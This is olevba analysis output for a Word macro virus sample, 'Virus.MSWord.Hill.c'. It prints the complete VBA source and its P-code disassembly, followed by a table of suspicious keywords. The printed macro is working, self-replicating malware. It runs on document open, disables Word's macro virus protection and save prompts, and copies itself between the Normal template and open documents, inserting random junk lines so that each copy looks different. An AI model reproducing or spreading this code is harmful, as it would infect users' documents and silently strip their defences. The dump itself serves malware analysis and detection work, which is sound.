olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Hill.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Hill.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public FJ, FRN
Public FMT, FVT
Sub AutoOpen()
   On Error Resume Next
 H = "�" 'xs˜9¡¡
   Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
   Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
 K = "y" '<xM0wŠqR‚
   Options.VirusProtection = False
 J = "g" 'Wx†]N¯¥U†E
   Options.ConfirmConversions = False
 V = "3" 'Ir£
   Options.SaveNormalPrompt = False
 U = "4" 'ªIG
   Randomize
   FMT = "F"
 F = "{" 'X‘H8
   FVT = FGN(1, 26, 65)
 U = "H" '†¤Š
   FRN = Mid(Str(Int(1 * Rnd + 1)), 2)
 F = "m" '2>žˆbb2
   If NT.CountOfLines < 60 Then
 B = "ª" 'š£
      FS = FCM(AD, NT)
 X = "¦" 'Kªn2Œ†”2
   Else
 Q = "�" '0=Y9
      FS = FCM(NT, AD)
 M = "˜" 'ThdƒA®‹C„
   End If
 J = "^" 'ž“1uŒs17œa
End Sub
Function FCM(FOC, FKC)
   FJ = 1
 L = "\" 'Ž=D�
   For I = 1 To FOC.CountOfLines
 I = "_" '­”¯H6\R–N¬
      If FCS(FOC.Lines(I, 1)) <> 1 Then
         FLN = FRP(FOC.Lines(I, 1), FMT, FVT)
 A = "®" '«šxR‚p
         FLN = FRP(FLN, "1", FRN)
 L = "¥" '¢¦j¤y¨i4
         FKC.InsertLines FJ, FLN
 U = "{" '0
         FJ = FJ + 1
 P = "t" 'x9
         If FCS(FOC.Lines(I, 1)) = 0 Then
 Q = "T" '‰V
            R = Rnd
 I = "C" 'L§zh¢Bv
            If R < 1 And R > 0.08 Then
               FKC.InsertLines FJ, " " + FGN(1, 26, 65) + " = " + Chr(34) + FGN(1, 128, 48) + Chr(34) + " " + Chr(39) + FGN(10, 128, 48)
 V = "�" '�7ƒ’ˆ
            End If
 T = "q" 'J9yDšn‹Ÿw
            If R < 0.08 And R > 0.05 Then
 E = "H" 'Y
            End If
 T = "6" 'K@u�095pKK
            If R < 0.05 And R > 0.03 Then
 A = "p" 'a§KrZC{t
            End If
 B = "š" '��W3W:=k
            If R > 0.03 Then FJ = FJ + 1
 X = "N" '2@
         End If
      End If
 L = "k" '\o\
   Next
End Function
Function FCS(FST)
   FCS = 0
 I = "¥" ']0_
   For I = 1 To Len(FST)
 U = "J" 'L
      If Mid(FST, I, 1) = Chr(39) Then FCS = 1
 G = "Z" '¢H`S=QTcg
   Next
 Y = "E" 'xGªIi‡ON¡
   If Mid(FST, 1, 1) <> " " Then FCS = 2
 I = "C" '8Yg�›
End Function
Function FGN(FSA, FSB, FSC)
   FGN = ""
 Q = "Š" '§pYJŽ1
   For FI = 1 To Int(FSA * Rnd + 1)
 V = "�" 'z‡FSd=
      FGN = FGN + Chr(Int(FSB * Rnd + FSC))
 F = "¡" 'Z˜_|mw™oLP
   Next
 L = "•" 'Pfg�­Il–zX
End Function
Function FRP(FST, FZA, FZB)
   FLA = Len(FZA)
 E = "§" '¥^˜1
   For ii = 1 To Len(FST)
 E = "©" 'v£kbnl¤¡‘„
      If Mid(FST, ii, FLA) = FZA Then
 E = "3" 'x`t‹ H7o�N
         FST = Mid(FST, 1, ii - 1) + FZB + Mid(FST, ii + FLA)
 C = "’" 'J1¦‚”gi
      End If
 N = "}" 'aC\Ldž@
   Next
 G = "y" 'Ÿ;;[R
   FRP = FST
 A = ":" 'r„}‚9wo
End Function

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Hill.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 7072 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn FJ
' 	VarDefn FRN
' Line #1:
' 	Dim (Public) 
' 	VarDefn FMT
' 	VarDefn FVT
' Line #2:
' 	FuncDefn (Sub AutoOpen())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	LitStr 0x0001 "�"
' 	St H 
' 	QuoteRem 0x0009 0x0006 "xs˜9¡¡"
' Line #5:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #6:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' Line #7:
' 	LitStr 0x0001 "y"
' 	St K 
' 	QuoteRem 0x0009 0x0009 "<xM0wŠqR‚"
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' 	LitStr 0x0001 "g"
' 	St J 
' 	QuoteRem 0x0009 0x000A "Wx†]N¯¥U†E"
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #11:
' 	LitStr 0x0001 "3"
' 	St V 
' 	QuoteRem 0x0009 0x0003 "Ir£"
' Line #12:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #13:
' 	LitStr 0x0001 "4"
' 	St U 
' 	QuoteRem 0x0009 0x0003 "ªIG"
' Line #14:
' 	ArgsCall Read 0x0000 
' Line #15:
' 	LitStr 0x0001 "F"
' 	St FMT 
' Line #16:
' 	LitStr 0x0001 "{"
' 	St False 
' 	QuoteRem 0x0009 0x0004 "X‘H8"
' Line #17:
' 	LitDI2 0x0001 
' 	LitDI2 0x001A 
' 	LitDI2 0x0041 
' 	ArgsLd FGN 0x0003 
' 	St FVT 
' Line #18:
' 	LitStr 0x0001 "H"
' 	St U 
' 	QuoteRem 0x0009 0x0003 "†¤Š"
' Line #19:
' 	LitDI2 0x0001 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	St FRN 
' Line #20:
' 	LitStr 0x0001 "m"
' 	St False 
' 	QuoteRem 0x0009 0x0007 "2>žˆbb2"
' Line #21:
' 	Ld NT 
' 	MemLd CountOfLines 
' 	LitDI2 0x003C 
' 	Lt 
' 	IfBlock 
' Line #22:
' 	LitStr 0x0001 "ª"
' 	St B 
' 	QuoteRem 0x0009 0x0002 "š£"
' Line #23:
' 	Ld AD 
' 	Ld NT 
' 	ArgsLd FCM 0x0002 
' 	St FS 
' Line #24:
' 	LitStr 0x0001 "¦"
' 	St X 
' 	QuoteRem 0x0009 0x0008 "Kªn2Œ†”2"
' Line #25:
' 	ElseBlock 
' Line #26:
' 	LitStr 0x0001 "�"
' 	St Q 
' 	QuoteRem 0x0009 0x0004 "0=Y9"
' Line #27:
' 	Ld NT 
' 	Ld AD 
' 	ArgsLd FCM 0x0002 
' 	St FS 
' Line #28:
' 	LitStr 0x0001 "˜"
' 	St M 
' 	QuoteRem 0x0009 0x0009 "ThdƒA®‹C„"
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	LitStr 0x0001 "^"
' 	St J 
' 	QuoteRem 0x0009 0x000A "ž“1uŒs17œa"
' Line #31:
' 	EndSub 
' Line #32:
' 	FuncDefn (Function FCM(FOC, FKC, id_FFFE As Variant))
' Line #33:
' 	LitDI2 0x0001 
' 	St FJ 
' Line #34:
' 	LitStr 0x0001 "\"
' 	St L 
' 	QuoteRem 0x0009 0x0004 "Ž=D�"
' Line #35:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld FOC 
' 	MemLd CountOfLines 
' 	For 
' Line #36:
' 	LitStr 0x0001 "_"
' 	St I 
' 	QuoteRem 0x0009 0x000A "­”¯H6\R–N¬"
' Line #37:
' 	Ld I 
' 	LitDI2 0x0001 
' 	Ld FOC 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd FCS 0x0001 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #38:
' 	Ld I 
' 	LitDI2 0x0001 
' 	Ld FOC 
' 	ArgsMemLd Lines 0x0002 
' 	Ld FMT 
' 	Ld FVT 
' 	ArgsLd FRP 0x0003 
' 	St FLN 
' Line #39:
' 	LitStr 0x0001 "®"
' 	St A 
' 	QuoteRem 0x0009 0x0006 "«šxR‚p"
' Line #40:
' 	Ld FLN 
' 	LitStr 0x0001 "1"
' 	Ld FRN 
' 	ArgsLd FRP 0x0003 
' 	St FLN 
' Line #41:
' 	LitStr 0x0001 "¥"
' 	St L 
' 	QuoteRem 0x0009 0x0008 "¢¦j¤y¨i4"
' Line #42:
' 	Ld FJ 
' 	Ld FLN 
' 	Ld FKC 
' 	ArgsMemCall InsertLines 0x0002 
' Line #43:
' 	LitStr 0x0001 "{"
' 	St U 
' 	QuoteRem 0x0009 0x0001 "0"
' Line #44:
' 	Ld FJ 
' 	LitDI2 0x0001 
' 	Add 
' 	St FJ 
' Line #45:
' 	LitStr 0x0001 "t"
' 	St P 
' 	QuoteRem 0x0009 0x0002 "x9"
' Line #46:
' 	Ld I 
' 	LitDI2 0x0001 
' 	Ld FOC 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd FCS 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #47:
' 	LitStr 0x0001 "T"
' 	St Q 
' 	QuoteRem 0x0009 0x0002 "‰V"
' Line #48:
' 	Ld Rnd 
' 	St R 
' Line #49:
' 	LitStr 0x0001 "C"
' 	St I 
' 	QuoteRem 0x0009 0x0007 "L§zh¢Bv"
' Line #50:
' 	Ld R 
' 	LitDI2 0x0001 
' 	Lt 
' 	Ld R 
' 	LitR8 0x147B 0x47AE 0x7AE1 0x3FB4 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #51:
' 	Ld FJ 
' 	LitStr 0x0001 " "
' 	LitDI2 0x0001 
' 	LitDI2 0x001A 
' 	LitDI2 0x0041 
' 	ArgsLd FGN 0x0003 
' 	Add 
' 	LitStr 0x0003 " = "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	LitDI2 0x0080 
' 	LitDI2 0x0030 
' 	ArgsLd FGN 0x0003 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 " "
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	LitDI2 0x0080 
' 	LitDI2 0x0030 
' 	ArgsLd FGN 0x0003 
' 	Add 
' 	Ld FKC 
' 	ArgsMemCall InsertLines 0x0002 
' Line #52:
' 	LitStr 0x0001 "�"
' 	St V 
' 	QuoteRem 0x0009 0x0005 "�7ƒ’ˆ"
' Line #53:
' 	EndIfBlock 
' Line #54:
' 	LitStr 0x0001 "q"
' 	St T 
' 	QuoteRem 0x0009 0x0009 "J9yDšn‹Ÿw"
' Line #55:
' 	Ld R 
' 	LitR8 0x147B 0x47AE 0x7AE1 0x3FB4 
' 	Lt 
' 	Ld R 
' 	LitR8 0x999A 0x9999 0x9999 0x3FA9 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #56:
' 	LitStr 0x0001 "H"
' 	St E 
' 	QuoteRem 0x0009 0x0001 "Y"
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	LitStr 0x0001 "6"
' 	St T 
' 	QuoteRem 0x0009 0x000A "K@u�095pKK"
' Line #59:
' 	Ld R 
' 	LitR8 0x999A 0x9999 0x9999 0x3FA9 
' 	Lt 
' 	Ld R 
' 	LitR8 0x1EB8 0xEB85 0xB851 0x3F9E 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #60:
' 	LitStr 0x0001 "p"
' 	St A 
' 	QuoteRem 0x0009 0x0008 "a§KrZC{t"
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	LitStr 0x0001 "š"
' 	St B 
' 	QuoteRem 0x0009 0x0008 "��W3W:=k"
' Line #63:
' 	Ld R 
' 	LitR8 0x1EB8 0xEB85 0xB851 0x3F9E 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld FJ 
' 	LitDI2 0x0001 
' 	Add 
' 	St FJ 
' 	EndIf 
' Line #64:
' 	LitStr 0x0001 "N"
' 	St X 
' 	QuoteRem 0x0009 0x0002 "2@"
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	LitStr 0x0001 "k"
' 	St L 
' 	QuoteRem 0x0009 0x0003 "\o\"
' Line #68:
' 	StartForVariable 
' 	Next 
' Line #69:
' 	EndFunc 
' Line #70:
' 	FuncDefn (Function FCS(FST, id_FFFE As Variant))
' Line #71:
' 	LitDI2 0x0000 
' 	St FCS 
' Line #72:
' 	LitStr 0x0001 "¥"
' 	St I 
' 	QuoteRem 0x0009 0x0003 "]0_"
' Line #73:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld FST 
' 	FnLen 
' 	For 
' Line #74:
' 	LitStr 0x0001 "J"
' 	St U 
' 	QuoteRem 0x0009 0x0001 "L"
' Line #75:
' 	Ld FST 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St FCS 
' 	EndIf 
' Line #76:
' 	LitStr 0x0001 "Z"
' 	St G 
' 	QuoteRem 0x0009 0x0009 "¢H`S=QTcg"
' Line #77:
' 	StartForVariable 
' 	Next 
' Line #78:
' 	LitStr 0x0001 "E"
' 	St Y 
' 	QuoteRem 0x0009 0x0009 "xGªIi‡ON¡"
' Line #79:
' 	Ld FST 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 " "
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	St FCS 
' 	EndIf 
' Line #80:
' 	LitStr 0x0001 "C"
' 	St I 
' 	QuoteRem 0x0009 0x0005 "8Yg�›"
' Line #81:
' 	EndFunc 
' Line #82:
' 	FuncDefn (Function FGN(FSA, FSB, FSC, id_FFFE As Variant))
' Line #83:
' 	LitStr 0x0000 ""
' 	St FGN 
' Line #84:
' 	LitStr 0x0001 "Š"
' 	St Q 
' 	QuoteRem 0x0009 0x0006 "§pYJŽ1"
' Line #85:
' 	StartForVariable 
' 	Ld FI 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld FSA 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	For 
' Line #86:
' 	LitStr 0x0001 "�"
' 	St V 
' 	QuoteRem 0x0009 0x0006 "z‡FSd="
' Line #87:
' 	Ld FGN 
' 	Ld FSB 
' 	Ld Rnd 
' 	Mul 
' 	Ld FSC 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St FGN 
' Line #88:
' 	LitStr 0x0001 "¡"
' 	St False 
' 	QuoteRem 0x0009 0x000A "Z˜_|mw™oLP"
' Line #89:
' 	StartForVariable 
' 	Next 
' Line #90:
' 	LitStr 0x0001 "•"
' 	St L 
' 	QuoteRem 0x0009 0x000A "Pfg�­Il–zX"
' Line #91:
' 	EndFunc 
' Line #92:
' 	FuncDefn (Function FRP(FST, FZA, FZB, id_FFFE As Variant))
' Line #93:
' 	Ld FZA 
' 	FnLen 
' 	St FLA 
' Line #94:
' 	LitStr 0x0001 "§"
' 	St E 
' 	QuoteRem 0x0009 0x0004 "¥^˜1"
' Line #95:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld FST 
' 	FnLen 
' 	For 
' Line #96:
' 	LitStr 0x0001 "©"
' 	St E 
' 	QuoteRem 0x0009 0x000A "v£kbnl¤¡‘„"
' Line #97:
' 	Ld FST 
' 	Ld ii 
' 	Ld FLA 
' 	ArgsLd Mid$ 0x0003 
' 	Ld FZA 
' 	Eq 
' 	IfBlock 
' Line #98:
' 	LitStr 0x0001 "3"
' 	St E 
' 	QuoteRem 0x0009 0x000A "x`t‹ H7o�N"
' Line #99:
' 	Ld FST 
' 	LitDI2 0x0001 
' 	Ld ii 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	Ld FZB 
' 	Add 
' 	Ld FST 
' 	Ld ii 
' 	Ld FLA 
' 	Add 
' 	ArgsLd Mid$ 0x0002 
' 	Add 
' 	St FST 
' Line #100:
' 	LitStr 0x0001 "’"
' 	St C 
' 	QuoteRem 0x0009 0x0007 "J1¦‚”gi"
' Line #101:
' 	EndIfBlock 
' Line #102:
' 	LitStr 0x0001 "}"
' 	St N 
' 	QuoteRem 0x0009 0x0008 "aC\Ldž@"
' Line #103:
' 	StartForVariable 
' 	Next 
' Line #104:
' 	LitStr 0x0001 "y"
' 	St G 
' 	QuoteRem 0x0009 0x0005 "Ÿ;;[R"
' Line #105:
' 	Ld FST 
' 	St FRP 
' Line #106:
' 	LitStr 0x0001 ":"
' 	St A 
' 	QuoteRem 0x0009 0x0007 "r„}‚9wo"
' Line #107:
' 	EndFunc 
' Line #108:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

